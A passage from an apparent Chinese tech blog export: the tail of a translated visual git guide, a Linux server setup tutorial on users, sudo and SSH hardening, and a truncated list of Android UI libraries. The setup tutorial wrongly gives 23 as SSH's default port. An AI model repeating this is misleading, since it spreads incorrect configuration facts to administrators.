here](http://marklodato.github.io/visual-git-guide/checkout-files.svg)\n\n当不指定文件名，而是给出一个（本地）分支时，那么 `_HEAD_` 标识会移动到那个分支（也就是说，我们「切换」到那个分支了），然后 stage 缓存和工作目录中的内容会和 `_HEAD_` 对应的提交节点一致。新提交节点（下图中的 `a47c3`）中的所有文件都会被复制（到 stage 缓存和工作目录中）；只存在于老的提交节点（`ed489`）中的文件会被删除；不属于上述两者的文件会被忽略，不受影响。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/checkout-branch.svg)\n\n如果既没有指定文件名，也没有指定分支名，而是一个标签、远程分支、SHA-1 值或者是像 `_master~3_` 类似的东西，就得到一个匿名分支，称作 `_detached HEAD_`（被分离的 `_HEAD_` 标识）。这样可以很方便地在历史版本之间互相切换。比如说你想要编译 1.6.6.1 版本的 Git，你可以运行 `git checkout v1.6.6.1`（这是一个标签，而非分支名），编译，安装，然后切换回另一个分支，比如说 `git checkout master`。然而，当提交操作涉及到「分离的 HEAD」时，其行为会略有不同，详情见在[下面](#detached)。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/checkout-detached.svg)\n\n### HEAD 标识处于分离状态时的提交操作\n\n当 `_HEAD_` 处于分离状态（不依附于任一分支）时，提交操作可以正常进行，但是不会更新任何已命名的分支。你可以认为这是在更新一个匿名分支。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/commit-detached.svg)\n\n一旦此后你切换到别的分支，比如说 `_master_`，那么这个提交节点（可能）再也不会被引用到，然后就会被丢弃掉了。注意这个命令之后就不会有东西引用 `_2eecb_`。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/checkout-after-detached.svg)\n\n但是，如果你想保存这个状态，可以用命令 `git checkout -b name` 来创建一个新的分支。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/checkout-b-detached.svg)\n\n### Reset\n\n`git reset` 命令把当前分支指向另一个位置，并且有选择的变动工作目录和索引。也用来在从历史commit历史中复制文件到索引，而不动工作目录。\n\n如果不给选项，那么当前分支指向到那个提交。如果用 `--hard` 选项，那么工作目录也更新，如果用 `--soft` 选项，那么都不变。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/reset-commit.svg)\n\n如果没有给出提交点的版本号，那么默认用 `_HEAD_`。这样，分支指向不变，但是索引会回滚到最后一次提交，如果用 `--hard` 选项，工作目录也同样。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/reset.svg)\n\n如果给了文件名(或者 `-p` 选项), 那么工作效果和带文件名的[checkout](#checkout)差不多，除了索引被更新。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/reset-files.svg)\n\n### Merge\n\n`git merge` 命令把不同分支合并起来。合并前，索引必须和当前提交相同。如果另一个分支是当前提交的祖父节点，那么合并命令将什么也不做。\n\n另一种情况是如果当前提交是另一个分支的祖父节点，就导致 `_fast-forward_` 合并。指向只是简单的移动，并生成一个新的提交。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/merge-ff.svg)\n\n否则就是一次真正的合并。默认把当前提交（`_ed489_` 如下所示）和另一个提交（`_33104_`）以及他们的共同祖父节点（`_b325c_`）进行一次[三方合并](http://en.wikipedia.org/wiki/Three-way_merge)。结果是先保存当前目录和索引，然后和父节点 `_33104_` 一起做一次新提交。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/merge.svg)\n\n### Cherry Pick\n\n`git cherry-pick` 命令「复制」一个提交节点并在当前分支做一次完全一样的新提交。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/cherry-pick.svg)\n\n### Rebase\n\n`git rebase` 是合并命令的另一种选择。合并把两个父分支合并进行一次提交，提交历史不是线性的。rebase 在当前分支上重演另一个分支的历史，提交历史是线性的。\n\n本质上，这是线性化的自动的 [cherry-pick](#cherry-pick)。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/rebase.svg)\n\n上面的命令都在 `_topic_` 分支中进行，而不是 `_master_` 分支，在 `_master_` 分支上重演，并且把分支指向新的节点。注意旧提交没有被引用，将被回收。\n\n要限制回滚范围，使用 `--onto` 选项。下面的命令在 `_master_` 分支上重演当前分支从 `_169a6_` 以来的最近几个提交，即 `_2c33a_`。\n\n![enter image description here](http://marklodato.github.io/visual-git-guide/rebase-onto.svg)\n\n同样有 `git rebase --interactive` 让你更方便的完成一些复杂操作，比如丢弃、重排、修改、合并提交。\n\n> 这篇文章是[**「git-recipes」**](https://github.com/geeeeeeeeek/git-recipes/)的一部分，点击 [**目录**](https://github.com/geeeeeeeeek/git-recipes/wiki/) 查看所有章节。\n>\n> 如果你觉得文章对你有帮助，欢迎点击右上角的 **Star** :star2: 或 **Fork** :fork_and_knife:。\n>\n> 如果你发现了错误，或是想要加入协作，请参阅 [Wiki 协作说明](https://github.com/geeeeeeeeek/git-recipes/issues/1)。\n\n`\n","tags":["git","翻译"],"categories":["代码笔记"]},{"title":"Linux服务器的初步配置流程","url":"/2017/08/02/2017-08-02-Linux-server-setup/","content":"开发网站的时候，常常需要自己配置Linux服务器。\n\n本文记录配置Linux服务器的初步流程，也就是系统安装完成后，下一步要做的事情。这主要是我自己的总结和备忘，如果有遗漏，欢迎大家补充。\n<!-- more -->\n下面的操作针对Debian/Ubuntu系统，其他Linux系统也类似，就是部分命令稍有不同。\n\n![](http://image.beekka.com/blog/2014/bg2014031401.jpg)\n\n## 第一步：root用户登录\n\n首先，使用root用户登录远程主机（假定IP地址是128.199.209.242）。\n\n<blockquote><pre><code class=\"language-bash\">\nssh root@128.199.209.242\n\n</code></pre></blockquote>\n\n这时，命令行会出现警告，表示这是一个新的地址，存在安全风险。键入yes，表示接受。然后，就应该可以顺利登入远程主机。\n\n接着，修改root用户的密码。\n\n<blockquote><pre><code class=\"language-bash\">\npasswd\n\n</code></pre></blockquote>\n\n## 第二步：新建用户\n\n首先，添加一个用户组（这里假定为admin用户组）。\n\n<blockquote><pre><code class=\"language-bash\">\naddgroup admin\n\n</code></pre></blockquote>\n\n然后，添加一个新用户（假定为bill）。\n\n<blockquote><pre><code class=\"language-bash\">\nuseradd -d /home/bill -s /bin/bash -m bill \n\n</code></pre></blockquote>\n\n上面命令中，参数d指定用户的主目录，参数s指定用户的shell，参数m表示如果该目录不存在，则创建该目录。\n\n接着，设置新用户的密码。\n\n<blockquote><pre><code class=\"language-bash\">\npasswd bill \n\n</code></pre></blockquote>\n\n将新用户（bill）添加到用户组（admin）。\n\n<blockquote><pre><code class=\"language-bash\">\nusermod -a -G admin bill \n\n</code></pre></blockquote>\n\n接着，为新用户设定sudo权限。\n\n<blockquote><pre><code class=\"language-bash\">\nvisudo \n\n</code></pre></blockquote>\n\nvisudo命令会打开sudo设置文件/etc/sudoers，找到下面这一行。\n\n<blockquote><pre><code class=\"language-bash\">\nroot    ALL=(ALL:ALL) ALL\n\n</code></pre></blockquote>\n\n在这一行的下面，再添加一行。\n\n<blockquote><pre><code class=\"language-bash\">\nroot    ALL=(ALL:ALL) ALL\nbill    ALL=(ALL) NOPASSWD: ALL\n\n</code></pre></blockquote>\n\n上面的NOPASSWD表示，切换sudo的时候，不需要输入密码，我喜欢这样比较省事。如果出于安全考虑，也可以强制要求输入密码。\n\n<blockquote><pre><code class=\"language-bash\">\nroot    ALL=(ALL:ALL) ALL\nbill    ALL=(ALL:ALL) ALL\n\n</code></pre></blockquote>\n\n然后，先退出root用户的登录，再用新用户的身份登录，检查到这一步为止，是否一切正常。\n\n<blockquote><pre><code class=\"language-bash\">\nexit\nssh bill@128.199.209.242\n\n</code></pre></blockquote>\n\n## 第三步：SSH设置\n\n首先，确定本机有SSH公钥（一般是文件~/.ssh/id_rsa.pub），如果没有的话，使用ssh-keygen命令生成一个（可参考我写的[SSH教程](http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html)）。\n\n在本机上另开一个shell窗口，将本机的公钥拷贝到服务器的authorized_keys文件。\n\n<blockquote><pre><code class=\"language-bash\">\ncat ~/.ssh/id_rsa.pub | ssh bill@128.199.209.242 'mkdir -p .ssh && cat - >> ~/.ssh/authorized_keys'\n\n# 或者在服务器端，运行下面命令\n\necho \"ssh-rsa [your public key]\" > ~/.ssh/authorized_keys\n\n</code></pre></blockquote>\n\n然后，进入服务器，编辑SSH配置文件/etc/ssh/sshd_config。\n\n<blockquote><pre><code class=\"language-bash\">\nsudo cp /etc/ssh/sshd_config ~\nsudo nano /etc/ssh/sshd_config\n\n</code></pre></blockquote>\n\n在配置文件中，将SSH的默认端口23改掉，可以改成从1025到65536之间的任意一个整数（这里假定为25000）。\n\n<blockquote><pre><code class=\"language-bash\">\nPort 25000\n\n</code></pre></blockquote>\n\n然后，检查几个设置是否设成下面这样，确保去除前面的#号。\n\n<blockquote><pre><code class=\"language-bash\">\nProtocol 2\n\nPermitRootLogin no\nPermitEmptyPasswords no\nPasswordAuthentication no\n\nRSAAuthentication yes\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\n  \nUseDNS no\n\n</code></pre></blockquote>\n\n上面主要是禁止root用户登录，以及禁止用密码方式登录。\n\n接着，在配置文件的末尾，指定允许登陆的用户。\n\n<blockquote><pre><code class=\"language-bash\">\nAllowUsers bill\n\n</code></pre></blockquote>\n\n保存后，退出文件编辑。\n\n接着，改变authorized_keys文件的权限。\n\n<blockquote><pre><code class=\"language-bash\">\nsudo chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh/\n\n</code></pre></blockquote>\n\n然后，重启SSHD。\n\n<blockquote><pre><code class=\"language-bash\">\nsudo service ssh restart\n\n# 或者\n\nsudo /etc/init.d/ssh restart\n\n</code></pre></blockquote>\n\n下面的一步是可选的。在本机~/.ssh文件夹下创建config文件，内容如下。\n\n<blockquote><pre><code class=\"language-bash\">\nHost s1\nHostName 128.199.209.242\nUser bill\nPort 25000\n\n</code></pre></blockquote>\n\n最后，在本机另开一个shell窗口，测试SSH能否顺利登录。\n\n<blockquote><pre><code class=\"language-bash\">\nssh s1\n\n</code></pre></blockquote>\n\n## 第四步：运行环境配置\n\n首先，检查服务器的区域设置。\n\n<blockquote><pre><code class=\"language-bash\">\nlocale\n\n</code></pre></blockquote>\n\n如果结果不是en_US.UTF-8，建议都设成它。\n\n<blockquote><pre><code class=\"language-bash\">\nsudo locale-gen en_US en_US.UTF-8 en_CA.UTF-8\nsudo dpkg-reconfigure locales\n\n</code></pre></blockquote>\n\n然后，更新软件。\n\n<blockquote><pre><code class=\"language-bash\">\nsudo apt-get update\nsudo apt-get upgrade\n\n</code></pre></blockquote>\n\n最后，再根据需要，做一些安全设置，比如搭建防火墙，关闭HTTP、HTTPs、SSH以外的端口，再比如安装Fail2Ban，详细可参考这篇[《Securing a Linux Server》](http://spenserj.com/blog/2013/07/15/securing-a-linux-server/)。\n\n（完）\n","tags":["Linux","server"],"categories":["代码笔记"]},{"title":"优秀的 Android 开源库","url":"/2017/08/02/Open-Android-lib/","content":"awesome-github-android-ui 是由[OpenDigg](http://www.opendigg.com/)整理并维护的安卓UI相关开源项目库集合。我们会定期同步[OpenDigg](http://www.opendigg.com/tags/android-ui)上的项目到这里，也欢迎各位[提交项目](https://github.com/opendigg/opending-share-projects)给我们。 \n\n如果收录的项目有错误，可以通过[issue](https://github.com/opendigg/awesome-github-android-ui/issues)反馈给我们。这里的项目Star数不是实时更新的，一般是一周更新一次。 \n<!-- more -->\n# 内容 \n\n- [抽屉菜单](#抽屉菜单) \n- [ListView](#ListView) \n- [WebView](#WebView) \n- [SwitchButton](#SwitchButton) \n- [按钮](#按钮) \n- [点赞按钮](#点赞按钮) \n- [进度条](#进度条) \n- [TabLayout](#TabLayout) \n- [图标](#图标) \n- [下拉刷新](#下拉刷新) \n- [ViewPager](#ViewPager) \n- [图表(Chart)](#图表(Chart)) \n- [菜单(Menu)](#菜单(Menu)) \n- [浮动菜单](#浮动菜单) \n- [对话框](#对话框) \n- [空白页](#空白页) \n- [滑动删除](#滑动删除) \n- [手势操作](#手势操作) \n- [RecyclerView](#RecyclerView) \n- [Card](#Card) \n- [Color](#Color) \n- [Drawable](#Drawable) \n- [Spinner](#Spinner) \n- [布局](#布局) \n- [模糊效果](#模糊效果) \n- [TabBar](#TabBar) \n- [AppBar](#AppBar) \n- [选择器(Picker)](#选择器(Picker)) \n- [跑马灯](#跑马灯) \n- [日历时间](#日历时间) \n- [主题样式](#主题样式) \n- [ImageView](#ImageView) \n- [通知](#通知) \n- [聊天视图](#聊天视图) \n- [Header](#Header) \n- [引导图(Intro)](#引导图(Intro)) \n- [图片](#图片) \n- [徽章(Badge)](#徽章(Badge)) \n- [RatingView](#RatingView) \n- [滚动效果(Scroll)](#滚动效果(Scroll)) \n- [时间轴](#时间轴) \n- [TreeView](#TreeView) \n- [SearchView](#SearchView) \n- [TagView](#TagView) \n- [TextView](#TextView) \n- [EditText](#EditText) \n- [Sliding](#Sliding) \n- [表单](#表单) \n- [分段控件](#分段控件) \n- [轮播图](#轮播图) \n- [文件操作](#文件操作) \n- [启动页](#启动页) \n- [MD](#MD) \n- [BottomNavigation](#BottomNavigation) \n- [Toast](#Toast) \n- [CreditCard](#CreditCard) \n- [ActionSheet](#ActionSheet) \n- [Wave](#Wave) \n- [Snackbar](#Snackbar) \n- [用户引导](#用户引导) \n- [Popup](#Popup) \n- [滑动返回](#滑动返回) \n- [TV组件](#TV组件) \n- [软键盘](#软键盘) \n- [状态栏](#状态栏) \n- [StepView](#StepView) \n- [表格(Table)](#表格(Table)) \n- [滚动视差(Parallex)](#滚动视差(Parallex)) \n- [SideBar](#SideBar) \n- [关于页面](#关于页面) \n- [详情页](#详情页) \n- [FAB](#FAB) \n- [Indicator](#Indicator) \n- [分享组件](#分享组件) \n- [升级更新](#升级更新) \n- [Toolbar](#Toolbar) \n- [Sort&Drag](#Sort&Drag) \n- [Emoji](#Emoji) \n- [Label](#Label) \n- [WheelView](#WheelView) \n- [PinCode](#PinCode) \n- [CoordinatorLayout](#CoordinatorLayout) \n- [页面切换](#页面切换) \n- [悬浮窗](#悬浮窗) \n- [地图](#地图) \n- [编辑器](#编辑器) \n- [SeekBar](#SeekBar) \n- [DownloadView](#DownloadView) \n- [其他](#其他) \n\n## 抽屉菜单 \n\n- [MaterialDrawer](https://github.com/mikepenz/MaterialDrawer) ★7582 - 安卓抽屉效果实现方案 \n- [Side-Menu.Android](https://github.com/Yalantis/Side-Menu.Android) ★3979 - 创意边侧菜单 \n- [FlowingDrawer](https://github.com/mxn21/FlowingDrawer) ★1784 - 向右滑动流动抽屉效果 \n- [SlidingRootNav](https://github.com/yarolegovich/SlidingRootNav) ★1589 - 仿DrawerLayout的ViewGroup \n- [FantasySlide](https://github.com/mzule/FantasySlide) ★1084 - 单手势滑出侧边栏与选择菜单 \n- [Floating-Navigation-View](https://github.com/andremion/Floating-Navigation-View) ★806 - 浮动菜单显示锚导航视图 \n- [material-drawer](https://github.com/heinrichreimer/material-drawer) ★538 - MD风格的自定义抽屉实现 \n- [SwipeMenuDemo](https://github.com/Brioal/SwipeMenuDemo) ★533 - 侧滑菜单动画效果库 \n- [ArcNavigationView](https://github.com/rom4ek/ArcNavigationView) ★353 - 具有曲线边缘的NavigationView \n- [QQSliddingMenu](https://github.com/drakeet/QQSliddingMenu) ★111 - 与QQ5.0 完全一模一样的侧滑菜单 \n- [SlideSideMenu](https://github.com/lemonade-hq/SlideSideMenu) ★69 - 滑动侧菜单的布局部件 \n\n## ListView \n\n- [baseAdapter](https://github.com/hongyangAndroid/baseAdapter) ★2685 - Android 万能的Adapter \n- [Pinned Section Listview](https://github.com/beworker/pinned-section-listview) ★2393 - 便于使用的ListView \n- [AsymmetricGridView](https://github.com/felipecsl/AsymmetricGridView) ★1410 - Android自定义列表视图 \n- [Renderers](https://github.com/pedrovgs/Renderers) ★1036 - 创建适配器的Android库 \n- [CalendarListView](https://github.com/Kelin-Hong/CalendarListView) ★766 - 可互动的ListView+CalendarView \n- [AndroidExpandingViewLibrary](https://github.com/diegodobelo/AndroidExpandingViewLibrary) ★528 - 创建Android动画折叠视图 \n- [ListItemView](https://github.com/lurbas/ListItemView) ★501 - 基于MD风格的列表item实现 \n- [WheelView](https://github.com/venshine/WheelView) ★462 - 基于ListView实现的Android滚轮控件 \n- [YLListView](https://github.com/yll2wcf/YLListView) ★216 - 仿IOS弹簧效果的ListView \n- [SearchListView](https://github.com/vivian8725118/SearchListView) ★152 - 带搜索栏的 listview \n- [ScollZoomListView](https://github.com/ruzhan123/ScollZoomListView) ★40 - 优雅的漫画阅读器插件 \n\n## WebView \n\n- [JsBridge](https://github.com/lzyzsd/JsBridge) ★3073 - Android的Java和JavaScript桥接 \n- [AndroidChromium](https://github.com/JackyAndroid/AndroidChromium) ★1532 - 谷歌浏览器安卓版源码项目 \n- [FinestWebView-Android](https://github.com/TheFinestArtist/FinestWebView-Android) ★1478 - 可自定义webview \n- [VideoEnabledWebView](https://github.com/cprcrack/VideoEnabledWebView) ★622 - Android的WebView和WebChromeClint类扩展 \n- [AgentWeb](https://github.com/Justson/AgentWeb) ★455 - 一个高度封装的 WebView \n- [CollapsingToolbar-With-Webview](https://github.com/RameshBhupathi/CollapsingToolbar-With-Webview) ★190 - 带有可折叠toolbar的Webview \n- [DSBridge-Android](https://github.com/wendux/DSBridge-Android) ★162 - 目前地球上最好的IOS及Android javascript bridge \n- [DSBridge-IOS](https://github.com/wendux/DSBridge-IOS) ★135 - 目前地球上最好的IOS javascript bridge \n- [WebViewNativeBridge](https://github.com/slm/WebViewNativeBridge) ★29 - 从WebView向Java通过url发送数据 \n- [ClickableWebView](https://github.com/AhmadNemati/ClickableWebView) ★22 - 检测图片上的点击 \n\n## SwitchButton \n\n- [ToggleButton](https://github.com/zcweng/ToggleButton) ★1770 - Android上类似iOS的开关控件 \n- [Android-SwitchIcon](https://github.com/zagum/Android-SwitchIcon) ★1470 - Switch图标的Google启动器风格实现 \n- [material-animated-switch](https://github.com/glomadrian/material-animated-switch) ★974 - 带有图标动画和颜色转换的Switch \n- [IconSwitch](https://github.com/polyak01/IconSwitch) ★580 - 自定义切换部件 \n- [SwitchButton](https://github.com/zcweng/SwitchButton) ★399 - 优美的轻量级自定义样式的Switch按钮 \n- [SHSwitchView](https://github.com/7heaven/SHSwitchView) ★322 - iOS7风格的Switch开关 \n- [SwitchButton](https://github.com/xiaopansky/SwitchButton) ★284 - 安卓开关按钮 \n- [switchView](https://github.com/799536960/switchView) ★19 - 带有文字的switch \n\n## 按钮 \n\n- [FancyButtons](https://github.com/medyo/Fancybuttons) ★1148 - 创建花式按钮 \n- [ArrowDownloadButton](https://github.com/fenjuly/ArrowDownloadButton) ★790 - 超酷的下载按钮 \n- [AnimShopButton](https://github.com/mcxtzhang/AnimShopButton) ★788 - 带伸缩位移旋转动画的购物车按钮 \n- [GoodView](https://github.com/venshine/GoodView) ★774 - Android点赞+1效果 \n- [StateButton](https://github.com/niniloveyou/StateButton) ★768 - 不必为每种类型的button写一个drawable \n- [fab](https://github.com/Scalified/fab) ★764 - 浮动按钮 \n- [JellyToggleButton](https://github.com/Nightonke/JellyToggleButton) ★706 - 果冻动态效果及缓动类型开关按钮 \n- [SparkButton](https://github.com/varunest/SparkButton) ★693 - 创建一个带动画效果的按钮 \n- [FabButton](https://github.com/ckurtm/FabButton) ★671 - 带有进度条指示器的环形浮动动作按钮 \n- [ProgressRoundButton](https://github.com/cctanfujun/ProgressRoundButton) ★634 - 显示进度的流畅下载按钮 \n- [HoldingButton](https://github.com/dewarder/HoldingButton) ★471 - 控制录音状态的按钮 \n- [SubmitButton](https://github.com/SparkYuan/SubmitButton) ★356 - 实用酷炫又优雅的提交按钮 \n- [ButtonProgressBar](https://github.com/ishaan1995/ButtonProgressBar) ★329 - 下载按钮进度条 \n- [MultiChoicesCircleButton](https://github.com/gjiazhe/MultiChoicesCircleButton) ★312 - 带3d视差效果的多选按钮 \n- [RaiflatButton](https://github.com/rubensousa/RaiflatButton) ★290 - 凸起的按钮 \n- [CProgressButton](https://github.com/jiang111/CProgressButton) ★255 - 仿iOS环形进度按钮 \n- [roundbutton](https://github.com/czy1121/roundbutton) ★243 - 可设置圆角背景边框的的按钮 \n- [PlayPauseButton](https://github.com/recruit-lifestyle/PlayPauseButton) ★233 - 制作动画播放状态的视图 \n- [swipe-button](https://github.com/ebanx/swipe-button) ★216 - swipe button \n- [SubmitButton](https://github.com/Someonewow/SubmitButton) ★189 - 带有进度动画的自定义提交按钮 \n- [Android-DivergeView](https://github.com/HomHomLin/Android-DivergeView) ★170 - 仿美拍直播的点赞动画 \n- [TriStateToggleButton](https://github.com/BeppiMenozzi/TriStateToggleButton) ★134 - 完全可自定义3态切换按钮 \n- [SegmentedButton](https://github.com/ceryle/SegmentedButton) ★107 - 类似IOS的带动画分割按钮 \n- [DxLoadingButton](https://github.com/StevenDXC/DxLoadingButton) ★83 - 带有动画的Android加载按钮 \n- [SuspendButtonLayout](https://github.com/laocaixw/SuspendButtonLayout) ★73 - 带浮动按钮的布局 \n- [floating-text-button](https://github.com/dimorinny/floating-text-button) ★49 - 带动作文本的简单浮动按钮 \n- [PentagonFloatingActionButton](https://github.com/developer-shivam/PentagonFloatingActionButton) ★43 - 浮动点击动画按钮 \n- [FreeRadioGroup](https://github.com/Sbingo/FreeRadioGroup) ★33 - 类似于苹果的虚拟辅助按钮 \n- [Hamburger-Button](https://github.com/LongDinhF/Hamburger-Button) ★32 - 完全定制的汉堡按钮 \n- [BadgeRadioButton](https://github.com/hcs-xph/BadgeRadioButton) ★25 - 仿QQ底部Tab切换RadioButton \n- [OrderButton](https://github.com/LinXiaoTao/OrderButton) ★21 - 仿饿了么下单按钮 \n\n## 点赞按钮 \n\n- [ShineButton](https://github.com/ChadCSong/ShineButton) ★2533 - 安卓闪光UI库 \n- [LikeButton](https://github.com/jd-alexander/LikeButton) ★1897 - 仿Twitter点赞时的的heart \n- [GoodView](https://github.com/venshine/GoodView) ★774 - Android点赞+1效果 \n- [SparkButton](https://github.com/varunest/SparkButton) ★693 - 创建一个带动画效果的按钮 \n- [ThumbUp](https://github.com/ldoublem/ThumbUp) ★559 - 精致的点赞控件 \n- [MagicFloatView](https://github.com/yanbober/MagicFloatView) ★232 - 自定义拓展漂浮路径的MagicFlyLinearLayout 控件 \n- [Android-DivergeView](https://github.com/HomHomLin/Android-DivergeView) ★170 - 仿美拍直播的点赞动画 \n- [LikeView](https://github.com/zFxiang/LikeView) ★34 - 仿即刻APP点赞桃心的效果 \n- [TumblrLikeAnimView](https://github.com/alex5241/TumblrLikeAnimView) ★15 - 仿Tumblr点赞动画效果 \n\n## 进度条 \n\n- [AVLoadingIndicatorView](https://github.com/81813780/AVLoadingIndicatorView) ★5055 - 安卓载入动画合集 \n- [NumberProgressBar](https://github.com/daimajia/NumberProgressBar) ★4026 - 多彩进度条 \n- [Android-SpinKit](https://github.com/ybq/Android-SpinKit) ★3305 - Android加载动画 \n- [LoadingDrawable](https://github.com/dinuscxj/LoadingDrawable) ★2630 - 安卓工具动画集合 \n- [CircleProgress](https://github.com/lzyzsd/CircleProgress) ★2415 - 三种圆形进度视图 \n- [ProgressWheel](https://github.com/Todd-Davies/ProgressWheel) ★2260 - 圆形旋转效果 \n- [CircularReveal](https://github.com/ozodrukh/CircularReveal) ★2034 - 创建加载动画效果 \n- [LoadingView](https://github.com/ldoublem/LoadingView) ★1719 - 简单的带有动画效果的加载控件 \n- [AndroidFillableLoaders](https://github.com/JorgeCastilloPrz/AndroidFillableLoaders) ★1603 - 有趣的填充型进程视图 \n- [ElasticDownload](https://github.com/Tibolte/ElasticDownload) ★1442 - 下载动画效果 \n- [MetaballLoading](https://github.com/dodola/MetaballLoading) ★1352 - 一个2d圆球加载 \n- [android-shapeLoadingView](https://github.com/zzz40500/android-shapeLoadingView) ★1321 - 高仿新版58 加载动画 \n- [Android-RoundCornerProgressBar](https://github.com/akexorcist/Android-RoundCornerProgressBar) ★1252 - Android圆角进度条库 \n- [MaterialProgressBar](https://github.com/DreaminginCodeZH/MaterialProgressBar) ★1213 - MD风格的进度条 \n- [WaveLoadingView](https://github.com/tangqi92/WaveLoadingView) ★1176 - 仿真波浪加载效果 \n- [WaveLoading](https://github.com/race604/WaveLoading) ★1094 - 能够提供波浪动画的Drawable \n- [mkloader](https://github.com/nntuyen/mkloader) ★1028 - 优美又流畅的自定义加载视图 \n- [GifLoadingView](https://github.com/Rogero0o/GifLoadingView) ★978 - webpage中的简单动画方法 \n- [ArcProgressStackView](https://github.com/Devlight/ArcProgressStackView) ★938 - arc模式进度条 \n- [AnimatedCircleLoadingView](https://github.com/jlmd/AnimatedCircleLoadingView) ★937 - 加载视图动画 \n- [Loading](https://github.com/yankai-victor/Loading) ★912 - 多个Android加载效果 \n- [CircularFillableLoaders](https://github.com/lopspower/CircularFillableLoaders) ★871 - 精致的环形填充加载效果 \n- [progress-activity](https://github.com/vlonjatg/progress-activity) ★793 - 进度条空视图及错误视图库 \n- [KProgressHUD](https://github.com/Kaopiz/KProgressHUD) ★757 - 安卓ProgressHUD实现 \n- [CatLoadingView](https://github.com/Rogero0o/CatLoadingView) ★756 - Android猫头像加载视图 \n- [CircleProgress](https://github.com/Fichardu/CircleProgress) ★755 - 带旋转动画的环形进度视图 \n- [CircleView](https://github.com/jakob-grabner/Circle-Progress-View) ★708 - 动画环形视图 \n- [Circular Music ProgressBar](https://github.com/aliab/circular-music-progressbar) ★627 - Android环形音乐进度条 \n- [ColorArcProgressBar](https://github.com/Shinelw/ColorArcProgressBar) ★616 - 可定制的圆形进度条 \n- [spots-dialog](https://github.com/d-max/spots-dialog) ★612 - Android提示对话框 \n- [CircularProgressView](https://github.com/rahatarmanahmed/CircularProgressView) ★605 - 环形进度条安卓视图 \n- [SlackLoadingView](https://github.com/JeasonWong/SlackLoadingView) ★604 - 模仿Slack加载动画 \n- [DilatingDotsProgressBar](https://github.com/JustZak/DilatingDotsProgressBar) ★598 - 自定义模糊进度条 \n- [RingProgressBar](https://github.com/HotBitmapGG/RingProgressBar) ★546 - MD风格的环形进度条 \n- [MagicProgressWidget](https://github.com/lingochamp/MagicProgressWidget) ★501 - 圆形进度条与横向进度条 \n- [FAB-Loading](https://github.com/SaeedMasoumi/FAB-Loading) ★482 - 浮动加载动画 \n- [CircleView](https://github.com/pavlospt/CircleView) ★480 - 包含标题和子标题的环形视图 \n- [RingProgress](https://github.com/ldoublem/RingProgress) ★472 - 带效果的环形进度条 \n- [CoolAndroidAnim](https://github.com/TomWithJerry/CoolAndroidAnim) ★472 - 酷炫的android loading效果 \n- [Android-SVProgressHUD](https://github.com/saiwu-bigkoo/Android-SVProgressHUD) ★464 - 精仿iOS的提示库 SVProgressHUD \n- [FlickerProgressBar](https://github.com/LineChen/FlickerProgressBar) ★444 - 安卓仿应用宝下载进度条 \n- [pageloader](https://github.com/arieridwan8/pageloader) ★346 - 轻松自定义加载页面 \n- [CircleAlarmTimerView](https://github.com/yingLanNull/CircleAlarmTimerView) ★306 - 圆形进度条 \n- [SquareLoading](https://github.com/yuweiguocn/SquareLoading) ★292 - 一个方形动画加载器 \n- [AdhesiveLoadingView](https://github.com/yxping/AdhesiveLoadingView) ★262 - 具有粘性的滑动小球loading \n- [OverWatchLoading](https://github.com/zhangyuChen1991/OverWatchLoading) ★250 - 守望先锋的加载动画效果 \n- [SwipeCoordinator](https://github.com/VictorAlbertos/SwipeCoordinator) ★218 - 简化动画滑动视图进程 \n- [MarkView](https://github.com/xiprox/MarkView) ★208 - 彩色圆弧的环形进度条 \n- [LikeSinaSportProgress](https://github.com/YangShaoXiong/LikeSinaSportProgress) ★204 - 仿新浪体育客户端的进度条 \n- [snackprogressbar](https://github.com/tingyik90/snackprogressbar) ★180 - 带有ProgressBar的增强型Snackbar \n- [BounceLoadingView](https://github.com/niniloveyou/BounceLoadingView) ★173 - 模仿饿了么加载效果 \n- [ProgressView](https://github.com/WhiteDG/ProgressView) ★156 - 多种样式的进度条 \n- [LoadingProgress](https://github.com/peng8350/LoadingProgress) ★148 - 加载进度条 \n- [SlidingSquaresLoader](https://github.com/biodunalfet/SlidingSquaresLoader) ★147 - 简单的进度加载 \n- [CutoLoadingView](https://github.com/andyxialm/CutoLoadingView) ★127 - 自定义加载视图 \n- [AwesomeProgressbar](https://github.com/alex5241/AwesomeProgressbar) ★108 - 支持左右两边同时滚动的进度条 \n- [LoadingDialog](https://github.com/ForgetAll/LoadingDialog) ★95 - 简单好用的LoadingDialog \n- [ZYDownloading](https://github.com/zhangyuChen1991/ZYDownloading) ★94 - 一个蛮酷的加载进度条 \n- [LazyLoadingViews](https://github.com/jineshfrancs/LazyLoadingViews) ★81 - Adapter视图中子视图加载效果 \n- [and_cube_progress](https://github.com/XBeats/and_cube_progress) ★74 - 正方体样式的loadingView \n- [GradeProgressView](https://github.com/niniloveyou/GradeProgressView) ★67 - 用来评估移动电话的进度条视图 \n- [ProProgressViews](https://github.com/DamanSingh4321/ProProgressViews) ★56 - Android精致进度视图收集库 \n- [OverwatchProgress](https://github.com/zjywill/OverwatchProgress) ★50 - 模仿Overwatch的进度条 \n- [CircleProgressView](https://github.com/eralpyucel/CircleProgressView) ★44 - 显示百分比进度的安卓组件 \n- [CircleProgressBar](https://github.com/AlexMofer/CircleProgressBar) ★36 - 带载入动画的环形进度条 \n- [BGAProgressBar-Android](https://github.com/bingoogolapple/BGAProgressBar-Android) ★31 - 安卓进度条 \n- [VideoLoadingView](https://github.com/XuDeveloper/VideoLoadingView) ★30 - 加载界面 \n- [LovelyProgressBar](https://github.com/anderson9/LovelyProgressBar) ★27 - 漂亮的加载动画 \n- [BaiduProgressBar](https://github.com/linglongxin24/BaiduProgressBar) ★23 - 仿百度加载动画 \n- [customprogressbar](https://github.com/android-jian/customprogressbar) ★19 - 自定义ProgressBar \n- 